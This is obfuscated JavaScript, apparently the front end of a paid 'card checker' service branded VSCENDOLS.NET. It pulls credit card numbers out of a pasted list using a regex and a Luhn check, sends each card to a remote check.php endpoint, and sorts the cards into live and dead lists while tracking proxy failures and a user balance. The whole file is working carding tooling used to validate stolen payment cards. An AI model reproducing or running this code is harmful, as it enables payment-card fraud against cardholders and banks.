var ajaxCall;
var docTitle = document.title;
var a = 0;
Array.prototype.remove = function (_0x3ecdx6) {
  var _0x3ecdx7 = this.indexOf(_0x3ecdx6);
  if (_0x3ecdx7 != -1) {
    this.splice(_0x3ecdx7, 1);
  }
  ;
  return this;
};
function enableTextArea(_0x3ecdx9) {
  $("#mailpass").attr("disabled", _0x3ecdx9);
}
function updateProgress(a, _0x3ecdxb) {
  $(".check-amount").text("Progress: " + a + "/" + _0x3ecdxb);
  var _0x3ecdxc = Math.floor(a / _0x3ecdxb * 100);
  $(".progress .bar").css("width", _0x3ecdxc + "%").text(_0x3ecdxc + "%");
  document.title = _0x3ecdxc + "% [" + a + "/" + _0x3ecdxb + "] VSCENDOLS.NET - Checking" + docTitle;
}
function gbrn_liveUp() {
  var _0x3ecdxe = parseInt($("livecount").html());
  _0x3ecdxe++;
  $("livecount").html(_0x3ecdxe + "");
}
function gbrn_dieUp() {
  var _0x3ecdxe = parseInt($("diecount").html());
  _0x3ecdxe++;
  $("diecount").html(_0x3ecdxe + "");
}
function gbrn_wrongUp() {
  var _0x3ecdxe = parseInt($("unknowncount").html());
  _0x3ecdxe++;
  $("unknowncount").html(_0x3ecdxe + "");
}
function stopLoading(_0x3ecdx9) {
  $("#checkStatus").html("<img src=//vscendols.top/pages/nocharge/img/clear.gif />");
  enableTextArea(false);
  $("#submit").attr("disabled", false);
  $("#stop").attr("disabled", true);
  if (_0x3ecdx9) {
    alert("Done");
  } else {
    ajaxCall.abort();
  }
  ;
}
function updateTextBox(_0x3ecdx13) {
  var _0x3ecdx14 = $("#mailpass").val().split("\n");
  _0x3ecdx14.remove(_0x3ecdx13);
  $("#mailpass").val(_0x3ecdx14.join("\n"));
}
function GbrnTmfn(_0x3ecdx16, _0x3ecdx17, _0x3ecdx18, _0x3ecdx19) {
  if (_0x3ecdx16.length < 1 || _0x3ecdx17 >= _0x3ecdx16.length) {
    stopLoading(true);
    return false;
  }
  ;
  if (_0x3ecdx19 >= _0x3ecdx18) {
    GbrnTmfn(_0x3ecdx16, _0x3ecdx17, _0x3ecdx18, 0);
    return false;
  }
  ;
  updateTextBox(_0x3ecdx16[_0x3ecdx17]);
  ajaxCall = $.ajax({url: "https://vscendols.top/pages/nocharge/check.php", dataType: "json", cache: false, type: "POST", beforeSend: function (_0x3ecdx1a) {
    $("#checkStatus").html("<img src=//vscendols.top/pages/nocharge/img/loading.gif />");
  }, data: "ajax=1&do=check&cclist=" + encodeURIComponent(_0x3ecdx16[_0x3ecdx17]), success: function (_0x3ecdx1b) {
    switch (_0x3ecdx1b.error) {
      case -1:
        _0x3ecdx17++;
        $("#wrong").append('<li class="media mail-read"><div class="media-body"> <div class="mail-message"><p class="mb-0">' + _0x3ecdx1b.msg + "</p>" + "</div></div></li>");
        updateProgress(_0x3ecdx17, _0x3ecdx16.length);
        gbrn_wrongUp();
        break;
      case 1:
        swal.fire("Oopss..", "Minimal 10 Balance To Check!", "error");
        stopLoading(true);
        return false;
        break;
      case 12:
        alert("Minimal 10 Balance to check");
        stopLoading(true);
        return false;
        break;
      case 13:
        alert("You are Member!");
        stopLoading(true);
        return false;
        break;
      case 3:
        $("#badsock").append(_0x3ecdx1b.msg);
        updateProgress(_0x3ecdx17, _0x3ecdx16.length);
        break;
      case 2:
        _0x3ecdx17++;
        $("#acc_die").append('<li class="media mail-read"><div class="media-body"> <div class="mail-message"><p class="mb-0">' + _0x3ecdx1b.msg + "</p>" + "</div></div></li>");
        _0x3ecdx19++;
        updateProgress(_0x3ecdx17, _0x3ecdx16.length);
        gbrn_dieUp();
        break;
      case 0:
        _0x3ecdx17++;
        $("#acc_live").append('<li class="media mail-read"><div class="media-body"> <div class="mail-message"><p class="mb-0">' + _0x3ecdx1b.msg + "</p>" + "</div></div></li>");
        gbrn_liveUp();
        updateProgress(_0x3ecdx17, _0x3ecdx16.length);
        break;
    }
    ;
    GbrnTmfn(_0x3ecdx16, _0x3ecdx17, _0x3ecdx18, _0x3ecdx19);
  }});
  return true;
}
function filterMP(a) {
  var _0x3ecdx1d = a.split("\n");
  var _0x3ecdx1e = new Array;
  var _0x3ecdx16 = new Array;
  for (var _0x3ecdx1a = 0; _0x3ecdx1a < _0x3ecdx1d.length; _0x3ecdx1a++) {
    if (_0x3ecdx1d[_0x3ecdx1a].length > 0) {
      var _0x3ecdx1f = /(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})/g;
      var _0x3ecdx20 = _0x3ecdx1d[_0x3ecdx1a].match(_0x3ecdx1f);
      if (null == _0x3ecdx20 || !LuhnCheck(_0x3ecdx20[0])) {
        continue;
      }
      ;
      if (_0x3ecdx1e.indexOf(_0x3ecdx20[0]) == -1) {
        _0x3ecdx1e.push(_0x3ecdx20[0]);
        _0x3ecdx16.push(_0x3ecdx1d[_0x3ecdx1a]);
      }
      ;
    }
  }
  ;
  return _0x3ecdx16;
}
function resetResult() {
  $("#acc_die,#wrong").html("");
  $("#acc_die_count,#wrong_count").text(0);
}
var LuhnCheck = function () {
  var a = [0, 2, 4, 6, 8, 1, 3, 5, 7, 9];
  return function (_0x3ecdxb) {
    var _0x3ecdxc = 0;
    var _0x3ecdx22;
    var _0x3ecdx1a = false;
    var _0x3ecdx1f = String(_0x3ecdxb).replace(/[^\d]/g, "");
    if (0 == _0x3ecdx1f.length) {
      return false;
    }
    ;
    for (var _0x3ecdx20 = _0x3ecdx1f.length - 1; _0x3ecdx20 >= 0; --_0x3ecdx20) {
      _0x3ecdx22 = parseInt(_0x3ecdx1f.charAt(_0x3ecdx20), 10);
      _0x3ecdxc += (_0x3ecdx1a = !_0x3ecdx1a) ? _0x3ecdx22 : a[_0x3ecdx22];
    }
    ;
    return _0x3ecdxc % 10 == 0;
  };
}();
$(document).ready(function () {
  $("#stop").attr("disabled", true).click(function () {
    stopLoading(false);
  });
  $("#submit").click(function () {
    var _0x3ecdx14 = filterMP($("#mailpass").val());
    var _0x3ecdx18 = parseInt($("#fail").val());
    var _0x3ecdx19 = 0;
    if ($("#mailpass").val().trim() == "") {
      swal.fire("Oopss..", "No Cards found!", "error");
      return false;
    }
    ;
    $("#mailpass").val(_0x3ecdx14.join("\n")).attr("disabled", true);
    $("#result").show();
    $("#check-progress").show();
    resetResult();
    $("#submit").attr("disabled", true);
    $("#stop").attr("disabled", false);
    updateProgress(0, _0x3ecdx14.length);
    GbrnTmfn(_0x3ecdx14, 0, _0x3ecdx18, 0);
    return false;
  });
});
function selectText(containerid) {
  if (document.selection) {
    var range = document.body.createTextRange();
    range.moveToElementText(document.getElementById(containerid));
    range.select();
  } else if (window.getSelection()) {
    var range = document.createRange();
    range.selectNode(document.getElementById(containerid));
    window.getSelection().removeAllRanges();
    window.getSelection().addRange(range);
  }
}
